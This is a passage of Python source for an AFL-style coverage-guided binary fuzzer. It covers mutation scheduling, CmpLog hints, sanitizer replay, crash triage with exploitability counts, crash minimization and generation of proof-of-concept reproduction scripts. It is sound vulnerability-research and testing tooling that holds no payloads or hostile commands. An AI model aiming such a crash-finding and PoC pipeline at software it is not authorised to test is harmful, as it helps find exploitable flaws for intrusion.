        self.memory_safety_enabled = coverage_guided  # Enable with coverage mode
        self.session.memory_safety_enabled = self.memory_safety_enabled

        self.sanitizer_runner: Optional[SanitizerReplay] = None
        if sanitizer_target_path:
            if sanitizer_max_runs <= 0:
                self.session.sanitizer_warning = "Sanitizer replay disabled (max runs set to 0)."
            elif os.path.isfile(sanitizer_target_path):
                self.sanitizer_runner = SanitizerReplay(
                    target_path=sanitizer_target_path,
                    target_args=target_args,
                    timeout_ms=sanitizer_timeout_ms,
                    use_stdin=use_stdin,
                    max_runs=sanitizer_max_runs,
                )
                self.session.sanitizer_target_path = sanitizer_target_path
                self.session.sanitizer_replay_enabled = True
                self.session.sanitizer_max_runs = sanitizer_max_runs
            else:
                self.session.sanitizer_warning = f"Sanitizer target not found: {sanitizer_target_path}"

        if self.sanitizer_runner:
            self.memory_safety_enabled = True
            self.session.memory_safety_enabled = True
        
        # Legacy corpus for dumb mode
        self.corpus: List[bytes] = []
        self.seed_dir = seed_dir
        
        # Load seeds
        if seed_dir and os.path.isdir(seed_dir):
            self._load_seeds()
        
        if not self.corpus and len(self.corpus_manager.entries) == 0:
            # Start with a minimal input
            default_input = b"A" * 16
            self.corpus.append(default_input)
            self.corpus_manager.add(default_input)

        if self.enable_cmp_hints:
            self._initialize_comparison_hints(target_path)

        # CmpLog/RedQueen Input-to-State Correspondence
        self.cmplog_tracer: Optional[CmpLogTracer] = None
        self.cmplog_enabled = enable_cmp_hints  # Use same flag
        self.cmplog_analysis_interval = 100  # Analyze every N iterations
        self.cmplog_mutation_probability = 0.25  # 25% chance to use CmpLog mutations
        self._last_cmplog_analysis = 0

        # Smart Dictionary Extraction
        self.smart_dict_extractor: Optional[SmartDictionaryExtractor] = None
        self.smart_dict_enabled = enable_cmp_hints  # Use same flag
        self._initialize_smart_dictionary(target_path)

        # Delta Debugger for minimization (initialized on demand)
        self.delta_debugger: Optional[DeltaDebugger] = None

        # Running state
        self._running = False
        self._cancel_event = asyncio.Event()
    
    def _load_seeds(self):
        """Load seed inputs from directory."""
        for filename in os.listdir(self.seed_dir):
            filepath = os.path.join(self.seed_dir, filename)
            if os.path.isfile(filepath):
                try:
                    with open(filepath, "rb") as f:
                        data = f.read()
                        if len(data) <= 1024 * 1024:  # Max 1MB
                            self.corpus.append(data)
                            self.mutation_engine.add_to_dictionary(data[:100])
                            # Add to corpus manager too
                            self.corpus_manager.add(data)
                except:
                    pass
        
        logger.info(f"Loaded {len(self.corpus)} seeds from {self.seed_dir}")

    def _initialize_comparison_hints(self, target_path: str):
        """Analyze binary for comparison hints and seed the dictionary/corpus."""
        try:
            generator = SymbolicExecutionHintGenerator(target_path)
            analysis = generator.analyze_binary()
            magic_values = analysis.get("magic_values", [])
            interesting_strings = analysis.get("interesting_strings", [])
            
            for value in magic_values:
                if isinstance(value, bytes):
                    self.mutation_engine.add_to_dictionary(value)
            for text in interesting_strings:
                if isinstance(text, str):
                    self.mutation_engine.add_to_dictionary(text.encode("utf-8", errors="replace"))
            
            self.session.comparison_magic_values = len(magic_values)
            self.session.comparison_hints_enabled = True
            self.symbolic_hint_generator = generator
            
            seed_input = self.corpus[0] if self.corpus else b"A" * 16
            hints = generator.generate_hints(seed_input)
            self.session.comparison_hints_generated = len(hints)
            
            for hint in hints[:10]:
                if hint.suggested_input:
                    self.corpus.append(hint.suggested_input)
                    self.corpus_manager.add(hint.suggested_input)
            self.session.corpus_size = len(self.corpus_manager.entries) or len(self.corpus)
        except Exception as e:
            logger.warning(f"Comparison hint initialization failed: {e}")

    def _initialize_smart_dictionary(self, target_path: str):
        """
        Extract dictionary entries from target binary using smart analysis.

        This populates the mutation engine with:
        - Strings found in the binary (ASCII and UTF-16)
        - Magic values and file format signatures
        - Constants from instruction operands
        - Format string patterns
        - Boundary values for integer fuzzing
        """
        if not self.smart_dict_enabled:
            return

        try:
            self.smart_dict_extractor = SmartDictionaryExtractor(
                target_path,
                max_entries=500,  # Reasonable limit
            )

            # Extract all dictionary entries
            entries = self.smart_dict_extractor.extract_all()

            # Add high-scored entries to mutation engine
            added_count = 0
            for entry in entries:
                if entry.score >= 1.0:  # Only add quality entries
                    self.mutation_engine.add_to_dictionary(entry.value)
                    added_count += 1

            # Update session stats
            stats = self.smart_dict_extractor.get_stats()
            self.session.smart_dict_entries = added_count
            self.session.smart_dict_strings = stats.get("ascii_strings", 0) + stats.get("utf16_strings", 0)
            self.session.smart_dict_constants = stats.get("constants", 0)
            self.session.smart_dict_magic = stats.get("magic_values", 0)

            logger.info(
                f"Smart dictionary extracted {added_count} entries: "
                f"{stats.get('ascii_strings', 0)} strings, "
                f"{stats.get('constants', 0)} constants, "
                f"{stats.get('magic_values', 0)} magic values"
            )

            # Export AFL-format dictionary for reference
            dict_path = os.path.join(self.output_dir, "auto_dictionary.txt")
            try:
                self.smart_dict_extractor.export_afl_dict(dict_path)
            except Exception:
                pass  # Non-critical

        except Exception as e:
            logger.warning(f"Smart dictionary extraction failed: {e}")
            self.smart_dict_extractor = None

    def _binary_supports_persistent(self) -> bool:
        """Check for persistent mode markers in the binary."""
        markers = [b"__AFL_LOOP", b"__AFL_PERSISTENT", b"__VR_PERSISTENT"]
        try:
            with open(self.session.target_path, "rb") as f:
                data = f.read(4 * 1024 * 1024)
            return any(marker in data for marker in markers)
        except Exception:
            return False

    def _extract_output_hints(self, result: ExecutionResult, max_hints: int = 5):
        """Extract potential comparison hints from program output."""
        if not (result.stdout or result.stderr):
            return
        
        text = (result.stdout + result.stderr).decode("utf-8", errors="replace")
        hints: List[bytes] = []
        
        for match in re.findall(r"0x[0-9a-fA-F]{2,16}", text):
            try:
                value = int(match, 16)
                if value <= 0xFFFFFFFFFFFFFFFF:
                    hints.append(value.to_bytes((value.bit_length() + 7) // 8 or 1, "little"))
            except ValueError:
                continue
        
        for match in re.findall(r"['\\\"]([^'\\\"]{2,32})['\\\"]", text):
            hints.append(match.encode("utf-8", errors="replace"))
        
        for hint in hints[:max_hints]:
            self.mutation_engine.add_to_dictionary(hint)

    async def _run_sanitizer_replay(self, input_data: bytes) -> List[MemoryError]:
        """Re-run input against sanitizer build to enrich crash triage."""
        if not self.sanitizer_runner:
            return []
        result = await self.sanitizer_runner.replay(input_data)
        if not result:
            return []
        combined_output = (
            result.stderr.decode("utf-8", errors="replace") +
            result.stdout.decode("utf-8", errors="replace")
        )
        return self.memory_safety_analyzer.sanitizer_parser.parse_any(combined_output)

    async def _start_harness(self):
        """Start the configured execution harness if needed."""
        if isinstance(self.harness, PersistentModeHarness):
            if not self._binary_supports_persistent():
                self.session.execution_warning = (
                    "Persistent mode requires __AFL_LOOP or __VR_PERSISTENT instrumentation. "
                    "Falling back to process mode."
                )
                self.harness = self._fallback_harness
                self.execution_mode = ExecutionMode.PROCESS
                self.session.execution_mode = self.execution_mode.value
                return
        
        start_method = getattr(self.harness, "start", None)
        if callable(start_method):
            try:
                result = start_method()
                if asyncio.iscoroutine(result):
                    await result
            except Exception as e:
                logger.warning(f"Failed to start harness: {e}")
        
        if getattr(self.harness, "_running", True) is False and self._fallback_harness:
            warning = getattr(self.harness, "last_error", None)
            if warning:
                self.session.execution_warning = warning
            logger.info("Falling back to process harness.")
            cleanup_method = getattr(self.harness, "cleanup", None)
            if callable(cleanup_method):
                try:
                    cleanup_method()
                except Exception:
                    pass
            self.harness = self._fallback_harness
            self.execution_mode = ExecutionMode.PROCESS
            self.session.execution_mode = self.execution_mode.value

    async def _stop_harness(self):
        """Stop the configured execution harness if needed."""
        stop_method = getattr(self.harness, "stop", None)
        if callable(stop_method):
            try:
                result = stop_method()
                if asyncio.iscoroutine(result):
                    await result
            except Exception:
                pass
    
    async def run(
        self,
        max_iterations: Optional[int] = None,
        max_time_seconds: Optional[int] = None,
    ) -> AsyncGenerator[Dict[str, Any], None]:
        """
        Run the fuzzing session with coverage-guided optimization.
        
        Args:
            max_iterations: Maximum number of executions
            max_time_seconds: Maximum runtime in seconds
            
        Yields:
            Progress events and crash notifications
        """
        self._running = True
        self._cancel_event.clear()
        self.session.status = "running"
        self.session.started_at = datetime.utcnow().isoformat()
        await self._start_harness()
        
        # Update corpus stats
        self.session.corpus_size = len(self.corpus_manager.entries) or len(self.corpus)
        
        yield {
            "type": "session_started",
            "session_id": self.session.id,
            "target": self.session.target_path,
            "corpus_size": self.session.corpus_size,
            "coverage_guided": self.coverage_guided,
            "scheduler_strategy": self.session.scheduler_strategy,
            "execution_mode": self.execution_mode.value,
            "coverage_backend": self.coverage_backend.value if self.coverage_backend else None,
            "coverage_map_size": self.coverage_tracker.bitmap_size,
            "coverage_available": self.session.coverage_available,
            "coverage_warning": self.session.coverage_warning,
            "comparison_hints_enabled": self.session.comparison_hints_enabled,
            "comparison_magic_values": self.session.comparison_magic_values,
            "execution_warning": self.session.execution_warning,
            "sanitizer_replay_enabled": self.session.sanitizer_replay_enabled,
            "sanitizer_warning": self.session.sanitizer_warning,
            "sanitizer_max_runs": self.session.sanitizer_max_runs,
            "sanitizer_target_path": self.session.sanitizer_target_path,
        }

        if self.session.coverage_warning:
            yield {
                "type": "coverage_unavailable",
                "coverage_backend": self.session.coverage_backend,
                "map_size": self.session.coverage_map_size,
                "message": self.session.coverage_warning,
            }
        
        iteration = 0
        start_time = time.time()
        last_stats_time = start_time
        
        try:
            while self._running:
                # Check termination conditions
                if self._cancel_event.is_set():
                    yield {"type": "cancelled"}
                    break
                
                if max_iterations and iteration >= max_iterations:
                    yield {"type": "max_iterations_reached", "count": iteration}
                    break
                
                elapsed = time.time() - start_time
                if max_time_seconds and elapsed >= max_time_seconds:
                    yield {"type": "max_time_reached", "seconds": elapsed}
                    break
                
                iteration += 1
                self.session.total_executions = iteration
                
                # Select input - use scheduler if coverage-guided
                if self.coverage_guided and len(self.corpus_manager.entries) > 0:
                    entry = self.scheduler.next()
                    if entry:
                        base_input = entry.data
                        parent_id = entry.id
                    else:
                        base_input = random.choice(self.corpus)
                        parent_id = None
                else:
                    base_input = random.choice(self.corpus)
                    parent_id = None
                
                # Mutate - with CmpLog/RedQueen support
                mutation_type = "standard"
                mutated_input = None

                # Initialize CmpLog tracer if needed
                if self.cmplog_enabled and self.cmplog_tracer is None:
                    self.cmplog_tracer = CmpLogTracer(self.harness)

                # Periodically run CmpLog analysis on corpus entries
                if (self.cmplog_enabled and self.cmplog_tracer and
                    iteration - self._last_cmplog_analysis >= self.cmplog_analysis_interval):
                    self._last_cmplog_analysis = iteration
                    try:
                        # Analyze current input for I2S mappings
                        await self.cmplog_tracer.analyze_input(base_input)
                        # Add extracted dictionary entries to mutation engine
                        for entry in self.cmplog_tracer.get_dictionary_entries():
                            self.mutation_engine.add_to_dictionary(entry)
                    except Exception as e:
                        logger.debug(f"CmpLog analysis failed: {e}")

                # Try CmpLog targeted mutation first (25% probability)
                if (self.cmplog_enabled and self.cmplog_tracer and
                    self.cmplog_tracer.i2s_mappings and
                    random.random() < self.cmplog_mutation_probability):
                    try:
                        targeted = self.cmplog_tracer.generate_targeted_mutations(
                            base_input, max_mutations=8
                        )
                        if targeted:
                            mutated_input = random.choice(targeted)
                            mutation_type = "cmplog_i2s"
                    except Exception as e:
                        logger.debug(f"CmpLog mutation failed: {e}")

                # Fall back to symbolic hints if CmpLog didn't produce mutation
                if mutated_input is None and self.enable_cmp_hints and self.symbolic_hint_generator:
                    if iteration % self.cmp_hint_refresh_interval == 0:
                        hints = self.symbolic_hint_generator.generate_hints(base_input)
                        self.session.comparison_hints_generated = len(hints)
                    if self.symbolic_hint_generator.hints and random.random() < 0.35:
                        candidates = self.symbolic_hint_generator.get_prioritized_mutations(
                            self.mutation_engine,
                            base_input,
                            num_mutations=4,
                        )
                        mutated_input = random.choice(candidates)
                        mutation_type = "cmp_hint"

                # Standard mutation if no specialized mutation was used
                if mutated_input is None:
                    mutated_input, mutation_type = self.mutation_engine.mutate_with_info(base_input)

                self.session.current_input_size = len(mutated_input)
                
                # Execute
                result = await self.harness.execute(mutated_input)

                if self.enable_cmp_hints:
                    self._extract_output_hints(result)

                coverage_has_hits = bool(result.coverage_data and any(result.coverage_data))
                if self.coverage_guided and self.coverage_provider:
                    if coverage_has_hits:
                        if not self.session.coverage_available:
                            self.session.coverage_available = True
                            self.session.coverage_warning = None
                        self.coverage_zero_streak = 0
                    else:
                        self.coverage_zero_streak += 1
                        if (
                            self.coverage_zero_streak >= self.coverage_zero_threshold
                            and not self.coverage_unavailable_emitted
                        ):
                            self.coverage_unavailable_emitted = True
                            self.session.coverage_available = False
                            self.session.coverage_warning = (
                                f"No coverage data observed after {self.coverage_zero_threshold} executions. "
                                "Target is likely uninstrumented or using an incompatible map size."
                            )
                            yield {
                                "type": "coverage_unavailable",
                                "coverage_backend": self.coverage_backend.value,
                                "map_size": self.coverage_tracker.bitmap_size,
                                "message": self.session.coverage_warning,
                            }
                
                # Process coverage (Phase 2)
                coverage_info = None
                found_new_coverage = False
                if self.coverage_guided and coverage_has_hits:
                    coverage_info = self.coverage_tracker.process_coverage(result.coverage_data)
                    found_new_coverage = coverage_info.new_edges > 0 or coverage_info.new_blocks > 0
                    
                    # Update session stats
                    self.session.total_edges_discovered = self.coverage_tracker.total_edges_discovered
                    self.session.coverage_percentage = self.coverage_tracker.get_coverage_percentage()
                    
                    # Add to corpus if new coverage found
                    if found_new_coverage:
                        added, new_entry = self.corpus_manager.add(
                            mutated_input,
                            coverage=coverage_info,
                            parent_id=parent_id,
                            mutation_type=mutation_type,
                        )
                        if added:
                            self.session.new_coverage_inputs += 1
                            self.session.corpus_size = len(self.corpus_manager.entries)
                            self.session.favored_inputs = len(self.corpus_manager.get_favored())
                            
                            yield {
                                "type": "new_coverage",
                                "iteration": iteration,
                                "new_edges": coverage_info.new_edges,
                                "total_edges": self.session.total_edges_discovered,
                                "corpus_size": self.session.corpus_size,
                                "input_id": new_entry.id if new_entry else None,
                            }
                    
                # Update scheduler scores
                if self.coverage_guided and parent_id:
                    self.scheduler.update_score(
                        parent_id,
                        found_new_coverage,
                        result.crashed,
                        exec_time_ms=result.duration_ms,
                    )
                    self.corpus_manager.record_execution(
                        parent_id,
                        result.crashed,
                        exec_time_ms=result.duration_ms,
                    )
                
                # Handle crash
                if result.crashed:
                    self.session.total_crashes += 1
                    
                    # Analyze
                    crash_info = self.analyzer.analyze(result, mutated_input)
                    
                    # Phase 3: Memory safety analysis
                    memory_errors = []
                    if self.memory_safety_enabled:
                        memory_errors = self.memory_safety_analyzer.analyze_crash(
                            result, crash_info
                        )
                    
                    # Store
                    is_new, bucket_id = self.crash_db.add_crash(crash_info)

                    sanitizer_errors: List[MemoryError] = []
                    if self.sanitizer_runner and is_new:
                        sanitizer_errors = await self._run_sanitizer_replay(mutated_input)
                        if sanitizer_errors:
                            memory_errors = self.memory_safety_analyzer._deduplicate_errors(
                                memory_errors + sanitizer_errors
                            )
                            self.memory_safety_analyzer.record_errors(crash_info.id, memory_errors)
                        self.session.sanitizer_runs = self.sanitizer_runner.get_runs()

                    if self.memory_safety_enabled and memory_errors:
                        # Update memory safety stats
                        self.session.memory_errors_detected += len(memory_errors)
                        for mem_error in memory_errors:
                            if "heap" in mem_error.error_type.value:
                                self.session.heap_errors += 1
                            if "stack" in mem_error.error_type.value:
                                self.session.stack_errors += 1
                            if mem_error.error_type == MemoryErrorType.HEAP_USE_AFTER_FREE:
                                self.session.uaf_errors += 1
                            if mem_error.severity in (CrashSeverity.EXPLOITABLE, CrashSeverity.PROBABLY_EXPLOITABLE):
                                self.session.exploitable_errors += 1
                    
                    if is_new:
                        self.session.unique_crashes += 1
                        crash_event = {
                            "type": "new_crash",
                            "crash_id": crash_info.id,
                            "bucket_id": bucket_id,
                            "crash_type": crash_info.crash_type.value,
                            "severity": crash_info.severity.value,
                            "input_hash": crash_info.input_hash,
                            "iteration": iteration,
                            "coverage_guided": self.coverage_guided,
                            "from_input": parent_id,
                        }
                        
                        # Add memory safety info if available
                        if memory_errors:
                            crash_event["memory_errors"] = [
                                {
                                    "type": e.error_type.value,
                                    "severity": e.severity.value,
                                    "description": e.description,
                                }
                                for e in memory_errors
                            ]
                            crash_event["exploitability_indicators"] = (
                                self.memory_safety_analyzer._get_exploitability_indicators(memory_errors)
                            )
                            if sanitizer_errors:
                                crash_event["sanitizer_errors"] = len(sanitizer_errors)
                        
                        yield crash_event
                    else:
                        yield {
                            "type": "duplicate_crash",
                            "bucket_id": bucket_id,
                            "crash_type": crash_info.crash_type.value,
                        }
                
                # Handle timeout
                if result.timed_out:
                    self.session.total_timeouts += 1
                
                # Periodic stats update
                current_time = time.time()
                if current_time - last_stats_time >= 5.0:  # Every 5 seconds
                    elapsed_total = current_time - start_time
                    self.session.executions_per_second = iteration / max(1, elapsed_total)
                    
                    stats_event = {
                        "type": "stats_update",
                        "iteration": iteration,
                        "total_crashes": self.session.total_crashes,
                        "unique_crashes": self.session.unique_crashes,
                        "timeouts": self.session.total_timeouts,
                        "exec_per_sec": round(self.session.executions_per_second, 1),
                        "elapsed_seconds": round(elapsed_total, 1),
                    }
                    
                    # Add coverage stats if enabled
                    if self.coverage_guided:
                        stats_event.update({
                            "total_edges": self.session.total_edges_discovered,
                            "coverage_pct": round(self.session.coverage_percentage, 2),
                            "corpus_size": self.session.corpus_size,
                            "favored_inputs": self.session.favored_inputs,
                            "new_coverage_inputs": self.session.new_coverage_inputs,
                            "coverage_available": self.session.coverage_available,
                            "coverage_warning": self.session.coverage_warning,
                        })
                    
                    if self.session.comparison_hints_enabled:
                        stats_event.update({
                            "comparison_hints_generated": self.session.comparison_hints_generated,
                            "comparison_magic_values": self.session.comparison_magic_values,
                        })

                    # Add CmpLog/RedQueen stats
                    if self.cmplog_tracer:
                        cmplog_stats = self.cmplog_tracer.get_stats()
                        stats_event.update({
                            "cmplog_i2s_mappings": cmplog_stats.get("active_mappings", 0),
                            "cmplog_dictionary_size": cmplog_stats.get("auto_dictionary_size", 0),
                            "cmplog_targeted_mutations": cmplog_stats.get("targeted_mutations_generated", 0),
                            "cmplog_comparisons_logged": cmplog_stats.get("comparisons_logged", 0),
                        })

                    # Add Smart Dictionary stats
                    if self.smart_dict_extractor:
                        stats_event.update({
                            "smart_dict_entries": self.session.smart_dict_entries,
                            "smart_dict_strings": self.session.smart_dict_strings,
                            "smart_dict_constants": self.session.smart_dict_constants,
                            "smart_dict_magic": self.session.smart_dict_magic,
                        })

                    # Add memory safety stats if enabled
                    if self.memory_safety_enabled:
                        stats_event.update({
                            "memory_errors": self.session.memory_errors_detected,
                            "heap_errors": self.session.heap_errors,
                            "stack_errors": self.session.stack_errors,
                            "uaf_errors": self.session.uaf_errors,
                            "exploitable_errors": self.session.exploitable_errors,
                        })
                    if self.sanitizer_runner:
                        stats_event["sanitizer_runs"] = self.session.sanitizer_runs
                    
                    yield stats_event
                    last_stats_time = current_time
                
                # Small delay to prevent CPU exhaustion
                await asyncio.sleep(0.001)
        
        except Exception as e:
            self.session.status = "error"
            self.session.error = str(e)
            yield {"type": "error", "error": str(e)}
        
        finally:
            self._running = False
            self.session.status = "completed"
            self.session.completed_at = datetime.utcnow().isoformat()
            await self._stop_harness()
            
            # Save coverage state
            if self.coverage_guided:
                cov_path = os.path.join(self.output_dir, "coverage_state.json")
                self.coverage_tracker.save_state(cov_path)
            
            # Final stats
            elapsed = time.time() - start_time
            final_stats = {
                "type": "session_completed",
                "total_executions": self.session.total_executions,
                "total_crashes": self.session.total_crashes,
                "unique_crashes": self.session.unique_crashes,
                "total_timeouts": self.session.total_timeouts,
                "elapsed_seconds": round(elapsed, 1),
                "exec_per_sec": round(iteration / max(1, elapsed), 1),
                "crash_db_stats": self.crash_db.get_stats(),
            }
            
            if self.coverage_guided:
                final_stats.update({
                    "coverage_stats": self.coverage_tracker.get_stats(),
                    "corpus_stats": self.corpus_manager.get_stats(),
                    "scheduler_stats": self.scheduler.get_stats(),
                })
            
            # Phase 3: Memory safety final report
            if self.memory_safety_enabled:
                final_stats.update({
                    "memory_safety_stats": {
                        "total_errors": self.session.memory_errors_detected,
                        "heap_errors": self.session.heap_errors,
                        "stack_errors": self.session.stack_errors,
                        "uaf_errors": self.session.uaf_errors,
                        "exploitable_errors": self.session.exploitable_errors,
                    },
                })
            if self.sanitizer_runner:
                final_stats["sanitizer_runs"] = self.session.sanitizer_runs
            
            yield final_stats
    
    def stop(self):
        """Stop the fuzzing session."""
        self._cancel_event.set()
        self._running = False
    
    def get_session(self) -> Dict[str, Any]:
        """Get current session state."""
        return self.session.to_dict()
    
    def get_crashes(self) -> List[Dict[str, Any]]:
        """Get all crash buckets."""
        return [b.to_dict() for b in self.crash_db.get_all_buckets()]
    
    def get_memory_safety_report(self, crash_id: Optional[str] = None) -> Dict[str, Any]:
        """
        Get memory safety analysis report.
        
        Args:
            crash_id: Optional specific crash ID. If None, returns summary.
            
        Returns:
            Memory safety analysis report
        """
        if crash_id:
            return self.memory_safety_analyzer.get_analysis_report(crash_id)
        
        # Return summary of all analyzed crashes
        all_errors = []
        for errors in self.memory_safety_analyzer.analyzed_crashes.values():
            all_errors.extend(errors)
        
        # Categorize
        error_type_counts = {}
        severity_counts = {}
        
        for error in all_errors:
            error_type_counts[error.error_type.value] = error_type_counts.get(error.error_type.value, 0) + 1
            severity_counts[error.severity.value] = severity_counts.get(error.severity.value, 0) + 1
        
        return {
            "total_crashes_analyzed": len(self.memory_safety_analyzer.analyzed_crashes),
            "total_memory_errors": len(all_errors),
            "error_type_distribution": error_type_counts,
            "severity_distribution": severity_counts,
            "session_stats": {
                "heap_errors": self.session.heap_errors,
                "stack_errors": self.session.stack_errors,
                "uaf_errors": self.session.uaf_errors,
                "exploitable_errors": self.session.exploitable_errors,
            },
            "recommendations": list(set(
                rec for error in all_errors 
                for rec in self.memory_safety_analyzer._get_recommendations([error])
            )),
        }
    
    async def minimize_crash(
        self,
        crash_id: str,
        strategy: str = "ddmin",
        max_attempts: int = 5000,
        use_delta_debug: bool = True,
        structured: bool = False,
    ) -> Dict[str, Any]:
        """
        Minimize a crash input to find the smallest reproducer.

        Uses deterministic delta debugging (ddmin) algorithm for provably
        minimal crash inputs, with optional token-based minimization for
        structured data (JSON, XML, etc.).

        Args:
            crash_id: ID of the crash to minimize
            strategy: Minimization strategy:
                - "ddmin": Deterministic delta debugging (recommended)
                - "binary": Binary search reduction
                - "block": Block-based removal
                - "linear": Byte-by-byte removal
                - "all": All strategies combined (legacy)
            max_attempts: Maximum minimization attempts
            use_delta_debug: Use new DeltaDebugger (True) or legacy CrashMinimizer
            structured: Use token-based minimization for structured inputs

        Returns:
            Minimization result dictionary including:
            - original_size, minimized_size, reduction_percentage
            - minimized_path, total_tests, ddmin_passes
            - still_crashes, crash_type, minimization_time
        """
        # Find the crash
        crash_info = None
        for bucket in self.crash_db.buckets.values():
            for crash in bucket.crashes:
                if crash.id == crash_id:
                    crash_info = crash
                    break
            if crash_info:
                break

        if not crash_info:
            return {"success": False, "error": f"Crash {crash_id} not found"}

        # Get the crash input
        input_path = crash_info.input_path
        if not os.path.isfile(input_path):
            return {"success": False, "error": f"Crash input file not found: {input_path}"}

        with open(input_path, "rb") as f:
            original_input = f.read()

        # Output directory for minimized inputs
        minimized_dir = os.path.join(self.output_dir, "minimized")
        os.makedirs(minimized_dir, exist_ok=True)

        # Use new DeltaDebugger for ddmin strategy
        if use_delta_debug and strategy in ("ddmin", "all"):
            # Initialize delta debugger if needed
            if self.delta_debugger is None:
                self.delta_debugger = DeltaDebugger(
                    harness=self.harness,
                    max_tests=max_attempts,
                    timeout_seconds=300.0,
                )

            # Run delta debugging
            if structured:
                result = await self.delta_debugger.minimize_structured(
                    original_input, minimized_dir
                )
            else:
                result = await self.delta_debugger.minimize(
                    original_input, minimized_dir
                )

            # Build result
            result_dict = result.to_dict()
            result_dict["success"] = result.still_crashes
            result_dict["algorithm"] = "ddmin_structured" if structured else "ddmin"
            result_dict["cache_stats"] = self.delta_debugger.get_stats()

            # Copy to standard location with crash ID
            if result.still_crashes and result.minimized_path:
                final_path = os.path.join(
                    minimized_dir,
                    f"min_{crash_id}_{result.minimized_size}b.bin"
                )
                if result.minimized_path != final_path:
                    shutil.copy2(result.minimized_path, final_path)
                result_dict["minimized_path"] = final_path

            return result_dict

        # Fall back to legacy CrashMinimizer for other strategies
        minimizer = CrashMinimizer(
            harness=self.harness,
            target_crash_type=crash_info.crash_type,
            max_iterations=max_attempts,
        )

        # Run minimization
        result = await minimizer.minimize(original_input, minimized_dir)

        # Build result
        result_dict = result.to_dict()
        result_dict["success"] = result.still_crashes
        result_dict["algorithm"] = "legacy"

        return result_dict
    
    def generate_poc(
        self, 
        crash_id: str,
        format: str = "python",
        output_path: Optional[str] = None,
    ) -> Dict[str, Any]:
        """
        Generate a Proof-of-Concept reproduction script for a crash.
        
        Args:
            crash_id: ID of the crash
            format: Output format (python, c, shell, report)
            output_path: Optional output file path
            
        Returns:
            PoC generation result
        """
        # Find the crash
        crash_info = None
        memory_errors = []
        for bucket in self.crash_db.buckets.values():
            for crash in bucket.crashes:
                if crash.id == crash_id:
                    crash_info = crash
                    # Get memory errors if available
                    if crash_id in self.memory_safety_analyzer.analyzed_crashes:
                        memory_errors = self.memory_safety_analyzer.analyzed_crashes[crash_id]
                    break
            if crash_info:
                break
        
        if not crash_info:
            return {"success": False, "error": f"Crash {crash_id} not found"}
        
        # Get the crash input
        input_path = crash_info.input_path
        if not os.path.isfile(input_path):
            return {"success": False, "error": f"Crash input file not found: {input_path}"}
        
        with open(input_path, "rb") as f:
            crash_input = f.read()
        
        # Convert memory errors to dict format for generator
        memory_error_dicts = [
            {
                "type": e.error_type.value,
                "description": e.description,
                "severity": e.severity.value,
                "address": e.address,
                "stack_trace": e.stack_trace,
            }
            for e in memory_errors
        ]
        
        # Generate based on format
        if format == "python":
            content = PoCGenerator.generate_python_poc(
                crash_input, 
                self.target_path, 
                self.target_args,
                crash_info.crash_type.value,
                memory_error_dicts,
            )
            ext = ".py"
        elif format == "c":
            content = PoCGenerator.generate_c_poc(
                crash_input,
                self.target_path,
                self.target_args,
                crash_info.crash_type.value,
            )
            ext = ".c"
        elif format == "shell":
            content = PoCGenerator.generate_shell_poc(
                crash_input,
                self.target_path,
                self.target_args,
                crash_info.crash_type.value,
            )
            ext = ".sh"
        elif format == "report":
            content = PoCGenerator.generate_analysis_report(
                crash_info,
                memory_error_dicts,
                {
                    "session_id": self.session.id,
                    "target": self.target_path,
                    "total_executions": self.session.total_executions,
                    "unique_crashes": self.session.unique_crashes,
                },
            )
            ext = ".md"
        else:
            return {"success": False, "error": f"Unknown format: {format}"}
        
        # Save if output path provided
        if output_path:
            final_path = output_path
        else:
            final_path = os.path.join(
                self.output_dir,
                "poc",
                f"poc_{crash_id}{ext}"
            )
        
        os.makedirs(os.path.dirname(final_path), exist_ok=True)
        with open(final_path, "w") as f:
            f.write(content)
        
        return {
            "success": True,
            "format": format,
            "path": final_path,
            "crash_id": crash_id,
            "content_preview": content[:500] + "..." if len(content) > 500 else content,
        }
    
    def cleanup(self):
        """Clean up resources."""
        self.harness.cleanup()
        if self.coverage_provider:
            self.coverage_provider.close()
        if self.sanitizer_runner:
            self.sanitizer_runner.cleanup()


# =============================================================================
# ACTIVE SESSIONS MANAGEMENT
# =============================================================================

_active_fuzzers: Dict[str, BinaryFuzzer] = {}


async def start_binary_fuzzing(
    target_path: str,
    target_args: str = "@@",
    seed_dir: Optional[str] = None,
    output_dir: Optional[str] = None,
    timeout_ms: int = 5000,
    max_iterations: Optional[int] = None,
    max_time_seconds: Optional[int] = None,
    dictionary: Optional[List[str]] = None,
    coverage_guided: bool = True,
    scheduler_strategy: str = "power_schedule",
    use_stdin: Optional[bool] = None,
    execution_mode: str = "auto",
    coverage_backend: str = "auto",
    coverage_map_size: int = 65536,
    enable_cmp_hints: bool = True,
    enable_compcov: bool = True,
    cmp_hint_refresh_interval: int = 500,
    persistent_max_execs: int = 10000,
    persistent_shm_size: int = 65536,
    sanitizer_target_path: Optional[str] = None,
    sanitizer_timeout_ms: int = 5000,
    sanitizer_max_runs: int = 10,
) -> AsyncGenerator[Dict[str, Any], None]:
    """
    Start a binary fuzzing session with coverage-guided optimization.
    
    Args:
        target_path: Path to target executable
        target_args: Command line template (@@ for input file)
        seed_dir: Directory with seed inputs
        output_dir: Directory for outputs and crashes
        timeout_ms: Execution timeout in milliseconds
        max_iterations: Maximum executions
        max_time_seconds: Maximum runtime
        dictionary: Custom dictionary entries
        coverage_guided: Enable coverage-guided fuzzing (Phase 2)
        scheduler_strategy: Seed scheduling strategy (round_robin, favored_first, rare_edge, power_schedule)
        use_stdin: Force stdin input instead of @@ file
        execution_mode: Execution harness mode (auto, process, forkserver, persistent)
        coverage_backend: Coverage backend (auto, afl_shm, none)
        coverage_map_size: Coverage map size for AFL-style instrumentation
        enable_cmp_hints: Enable comparison hint generation
        enable_compcov: Enable comparison coverage env var
        cmp_hint_refresh_interval: Iterations between hint refresh
        persistent_max_execs: Max executions per persistent instance
        persistent_shm_size: Shared memory size for persistent mode
        sanitizer_target_path: Optional sanitizer build path for replay
        sanitizer_timeout_ms: Timeout for sanitizer replay runs
        sanitizer_max_runs: Max sanitizer replays per session
        
    Yields:
        Progress events
    """
    # Validate target exists
    if not os.path.isfile(target_path):
        yield {"type": "error", "error": f"Target not found: {target_path}"}
        return
    
    # Convert dictionary
    dict_bytes = None
    if dictionary:
        dict_bytes = [d.encode() if isinstance(d, str) else d for d in dictionary]
    
    # Create fuzzer with Phase 2 options
    fuzzer = BinaryFuzzer(
        target_path=target_path,
        target_args=target_args,
        seed_dir=seed_dir,
        output_dir=output_dir,
        timeout_ms=timeout_ms,
        dictionary=dict_bytes,
        coverage_guided=coverage_guided,
        scheduler_strategy=scheduler_strategy,
